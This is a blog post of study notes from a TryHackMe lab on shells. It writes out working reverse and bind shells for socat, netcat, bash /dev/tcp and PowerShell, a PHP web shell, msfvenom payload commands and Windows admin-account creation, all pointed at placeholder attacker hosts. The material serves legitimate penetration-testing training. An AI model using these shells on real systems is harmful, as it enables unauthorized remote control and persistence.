---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-28 05:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-28-tryhackme-complete-beginner.html
author: 100007
---

<h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2021-10-28</p>
<h2 id="what-the-shell">What the Shell?</h2>
<h3 id="socat-encrypted-shells">Socat Encrypted Shells</h3>
<p>Socat can also make encrypted connections, which foil after-the-fact network analysis and may circumvent IDS entirely.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate a self-signed certificate.</span>
<span class="c">#</span>
openssl req <span class="nt">-newkey</span> rsa:2048 <span class="se">\</span>
<span class="nt">-nodes</span> <span class="se">\</span>
<span class="nt">-keyout</span> shell.key <span class="se">\</span>
<span class="nt">-x509</span> <span class="se">\</span>
<span class="nt">-days</span> 362 <span class="se">\</span>
<span class="nt">-out</span> shell.crt
<span class="c"># Create a PEM file combining the certificate and key.</span>
<span class="c">#</span>
<span class="nb">cat </span>shell.key shell.crt <span class="o">&gt;</span> shell.pem
<span class="c"># Start a listener.</span>
<span class="c">#</span>
socat <span class="se">\</span>
OPENSSL-LISTEN:<span class="nv">$LISTENER_PORT</span>,cert<span class="o">=</span>shell.pem,verify<span class="o">=</span>0 -
<span class="c"># Start the reverse shell on the target.</span>
<span class="c">#</span>
socat <span class="se">\</span>
OPENSSL:<span class="nv">$ATTACKER_IP</span>:<span class="nv">$LISTENER_PORT</span>,verify<span class="o">=</span>0 <span class="se">\</span>
EXEC:<span class="s2">"/bin/bash -li"</span>
</code></pre></div></div>
<p>The PEM file needs to be generated on whichever system is listening, so for a bind shell the first two steps will need to be done on the target instead of the attacker. The <code class="language-plaintext highlighter-rouge">verify=0</code> directive turns off certificate validation, so this isn’t a “secure” connection in the sense that it’s been <em>authenticated</em>, but it is secure in the sense that it’s <em>encrypted</em>.</p>
<p>Since Windows doesn’t have an OpenSSL binary installed by default, it will generally be necessary to copy the PEM file across from the attacker.</p>
<p>Auto-stabilized shell using encryption (UNIX-like targets only):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attacker: Connect $LISTENER_PORT to the current TTY,</span>
<span class="c"># send raw keycodes, and turn off terminal echo.</span>
<span class="c"># Basically the `stty raw -echo`.</span>
<span class="c">#</span>
socat <span class="se">\</span>
OPENSSL-LISTEN:<span class="nv">$LISTENER_PORT</span>,cert<span class="o">=</span>shell.pem,verify<span class="o">=</span>0 <span class="se">\</span>
FILE:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0
<span class="c"># Target: Connect the listener on the attacker to an</span>
<span class="c"># interactive login bash shell.</span>
<span class="c">#</span>
<span class="c"># pty - allocate a PTTY</span>
<span class="c"># stderr - redirect STDERR to the attacker</span>
<span class="c"># sigint - pass signals (Ctrl+C) through</span>
<span class="c"># setsid - use a new session</span>
<span class="c"># sane - use a variety of tweaks to “normalize” the</span>
<span class="c"># terminal’s environment</span>
<span class="c">#</span>
socat <span class="se">\</span>
OPENSSL:<span class="nv">$ATTACKER_IP</span>:<span class="nv">$LISTENER_PORT</span>,verify<span class="o">=</span>0 <span class="se">\</span>
EXEC:<span class="s2">"/bin/bash -li"</span>,pty,stderr,sigint,setsid,sane
</code></pre></div></div>
<h3 id="common-shell-payloads">Common Shell Payloads</h3>
<p>Pre-compiled, statically-linked Windows binaries for red teaming can be found in /usr/share/windows-binaries.</p>
<p>Because the <code class="language-plaintext highlighter-rouge">-e</code> switch is considered insecure (for the very reasons we’re fond of it), many UNIX-like operating systems ship a version of netcat without it. Working around this leads to the common named pipe pattern:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkfifo</span> /tmp/p
nc <span class="nt">-lvnp</span> <span class="nv">$LISTENER_PORT</span> &lt; /tmp/p | /bin/sh <span class="o">&gt;</span>/tmp/p 2&gt;&amp;1
<span class="nb">rm</span> /tmp/p
</code></pre></div></div>
<p>(This example creates a bind shell, but we’ve also seen examples that create reverse shells. Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications.)</p>
<p>You can do the same thing with PowerShell to create a reverse shell, albeit with a much more cryptic command.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('&lt;IP&gt;',&lt;PORT&gt;);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%&#x007b;0&#x007d;;while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0)&#x007b;;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()&#x007d;;</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">
</span></code></pre></div></div>
<p>Note that <code class="language-plaintext highlighter-rouge">&lt;IP&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;PORT&gt;</code> need to be appropriately replaced in the above code.</p>
<ul>
<li><a href="https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html">2021-10-02 - TryHackMe: Complete Beginner</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Reverse Shell Cheat Sheet</a></li>
</ul>
<h3 id="msfvenom">msfvenom</h3>
<p>Definitions:</p>
<ul>
<li>STAGED payloads use an initial stage whose job it is to establish a reverse connection and then load the actual shell code (the second stage) into memory. This helps minimize initial payload size and evade IDS, but tends to require more specialized code. Metasploit multi/handler + Meterpreter use this approach.</li>
<li>STAGELESS payloads are one-stop shops — basically, everything we’ve been working with outside of Metasploit falls in this bucket. Easier to work with and understand, but bulkier and more likely to trigger alarms.</li>
</ul>
<p>As memory scanning has become more common, staged payloads have lost some of their alure.</p>
<p>Fortunately (unfortunately?) msfvenom will automate our reverse shell needs. It can, among other things, generate Windows executables that will set up a reverse shell for you.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell/reverse_tcp <span class="se">\</span>
<span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe <span class="se">\</span>
<span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ATTACKER_IP</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$LISTENER_PORT</span>
</code></pre></div></div>
<p>The payload (<code class="language-plaintext highlighter-rouge">-p</code>) switch takes a Metasploit payload name. Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads). Staged payloads replace the first <code class="language-plaintext highlighter-rouge">_</code> with a <code class="language-plaintext highlighter-rouge">/</code>, so windows/x64/shell/reverse_tcp is a staged while windows/x64/shell_revers_tcp is stageless.</p>
<p>List all available payloads using <code class="language-plaintext highlighter-rouge">msfvenom --list payloads</code>.</p>
<p>Interestingly, Metasploit/Meterpeter shells are banned from som certification examinations. I guess because they’re just too powerful.</p>
<h3 id="metasploit-multihandler">Metasploit Multi/Handler</h3>
<p>Be sure to set the right PAYLOAD when using multi/handler!</p>
<h3 id="webshells">WebShells</h3>
<p>Webshells are shells that run within a webserver, typically receiving input via GET variables or a form, and outputting to the page HTML. So, the simplest (PHP) web shell might be:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="mf">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>Web shells are, by their nature, non-interactive.</p>
<p>Check out /usr/share/webshells on Kali Linux for some example webshells. In general, the most capable webshells only work on UNIX-like systems. For Windows systems, webshells are normally only a stepping stone to a normal reverse shell.</p>
<h3 id="next-steps">Next Steps</h3>
<p>Adding a user on Windows (once you have access to SYSTEM or an administrator account):</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="kd">user</span> $USERNAME $PASSWORD <span class="na">/add
</span><span class="nb">net</span> <span class="kd">localgroup</span> <span class="kd">administrators</span> $USERNAME <span class="na">/add
</span></code></pre></div></div>
<p>In general, you don’t want to stay in reverse-shell land any longer than you have to.</p>
<h3 id="linux-practice-box">Linux Practice Box</h3>
<blockquote>
<p>Try uploading a webshell to the Linux box, then use the command: <code class="language-plaintext highlighter-rouge">nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> to send a reverse shell back to a waiting listener on your own machine.</p>
</blockquote>
<p>Use /usr/share/webshells/php/simple-backdoor.php, and then go to this URL: <code class="language-plaintext highlighter-rouge">http://10.10.106.112/uploads/simple-backdoor.php?cmd=nc%20&lt;IP&gt;%20&lt;PORT&gt;%20-e%20/bin/bash</code> (where I’m redacting my <code class="language-plaintext highlighter-rouge">&lt;IP&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;PORT&gt;</code>).</p>
<blockquote>
<p>Navigate to <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code> in Kali Linux and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.</p>
</blockquote>
<p>Much more comfy. I hadn’t realized before how much nicer this reverse shell is than what we typically use.</p>
<p>Also, one big reason to want to “stabilize” a reverse shell — to get tab completion!</p>
<blockquote>
<p>Log into the Linux machine over SSH using the provided credentials. Use the <code class="language-plaintext highlighter-rouge">mkfifo</code> method to experiment with bind and reverse netcat shells.</p>
</blockquote>
<p>Remember, <code class="language-plaintext highlighter-rouge">-l</code> and <code class="language-plaintext highlighter-rouge">-p</code> are for <em>listners</em>!</p>
<blockquote>
<p>Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.</p>
</blockquote>
<p>Okay, the auto-stabilized socat shells are pretty freakin’ cool.</p>
<p>…Also, I’m really not sure why socat’s syntax is considered that much harder. It’s pretty readable.</p>
<blockquote>
<p>Look through PayloadsAllTheThings and try some of the other reverse shell techniques. Try to analyze them and see <em>why</em> they work.</p>
</blockquote>
<p>If you have access to bash with the virtual /dev/tcp device (this actually live in bash, not in /dev) then this is a pretty handy reverse shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-li</span> &amp;&gt; /dev/tcp/<span class="nv">$ATTACKER_IP</span>/<span class="nv">$LISTENER_PORT</span> 0&gt;&amp;1
</code></pre></div></div>
<p>Catch it with netcat or socat.</p>
<p>(That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I <em>think</em> what’s happening here is that /dev/tcp is bidirectional “out of the box” — incoming data comes out, just as outgoing data goes in — so binding all three “core” file descriptors to it does the right thing. That, and realize that the <code class="language-plaintext highlighter-rouge">X&gt;&amp;Y</code> construct means “bind file descriptor X to file descriptor Y”, and <code class="language-plaintext highlighter-rouge">&amp;&gt;</code> is just short for <code class="language-plaintext highlighter-rouge">2&gt;&amp;1 &gt;</code>, and <code class="language-plaintext highlighter-rouge">&gt;</code> is just short for <code class="language-plaintext highlighter-rouge">1 &gt;</code>. So really what’s happening here is that we bind STDERR to STDOUT with and implicit <code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code>, then bind STDOUT to /dev/tcp with an implicit <code class="language-plaintext highlighter-rouge">1 &gt;</code>, then bind STDIN to /dev/tcp as well with <code class="language-plaintext highlighter-rouge">0&gt;&amp;1</code>.)</p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Reverse Shell Cheat Sheet</a></li>
<li><a href="https://cardboard-iguana.com/notes/netcat.html">Using “netcat”</a></li>
<li><a href="https://cardboard-iguana.com/notes/socat.html">Using “socat”</a></li>
</ul>
<h3 id="windows-practice-box">Windows Practice Box</h3>
<blockquote>
<p>Try uploading and activating the <code class="language-plaintext highlighter-rouge">php-reverse-shell</code>. Does this work?</p>
</blockquote>
<p>Unsurprisingly, <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> does <em>not</em> work on a Windows box.</p>
<blockquote>
<p>Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.</p>
</blockquote>
<p>Evil, URL-encoded version of the PowerShell reverse shell from above:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
</code></pre></div></div>
<p>Remember to replace <code class="language-plaintext highlighter-rouge">&lt;IP&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;PORT&gt;</code>.</p>
<p>One annoying thing about this reverse shell… There’s no initial prompt, so you have no idea whether you’ve connected or not. but as soon as you enter a command (<code class="language-plaintext highlighter-rouge">whoami</code>, etc.), a prompt will appear after the output. On the plus side, however, this reverse shell will persist even after the PHP script times out!</p>
<blockquote>
<p>The webserver is running with SYSTEM privileges. Create a new user and add it to the “administrators” group, then login over RDP.</p>
</blockquote>
<p>Use:</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="kd">user</span> $USERNAME $PASSWORD <span class="na">/add
</span><span class="nb">net</span> <span class="kd">localgroup</span> <span class="kd">administrators</span> $USERNAME <span class="na">/add
</span></code></pre></div></div>
<p>It’s worth noting that users added via <code class="language-plaintext highlighter-rouge">net user</code> seem to bypass Windows’ password policies…</p>
<p>It seems that xfreerdp is installed on Kali Linux, so we can connect from there.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /dynamic-resolution <span class="se">\</span>
+clipboard <span class="se">\</span>
/cert:ignore <span class="se">\</span>
/v:<span class="nv">$TARGET_IP</span> <span class="se">\</span>
/u:<span class="nv">$USER</span> <span class="se">\</span>
/p:<span class="nv">$PASSWORD</span>
</code></pre></div></div>
<blockquote>
<p>Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.</p>
</blockquote>
<p>It doesn’t look like <em>either</em> socat or netcat are installed on this server (contrary to what the exercise states). However, uploading /usr/share/windows-binaries/nc.exe at least gives us netcat (and running PowerShell using the <code class="language-plaintext highlighter-rouge">-e powershell.exe</code> switch works fine).</p>
<blockquote>
<p>Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.</p>
</blockquote>
<p>In practice, this is going to require uploading both a simple webshell <em>and</em> the relevant msfvenom payload (it’s also possible to start the Meterpreter payloads using the RDP session fired up above, but this seems less useful).</p>
<blockquote>
<p>Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat — does this work?</p>
</blockquote>
<p>Unsurprisingly, neither version of Meterpreter works, though netcat at least catches an incoming connection in both cases.</p>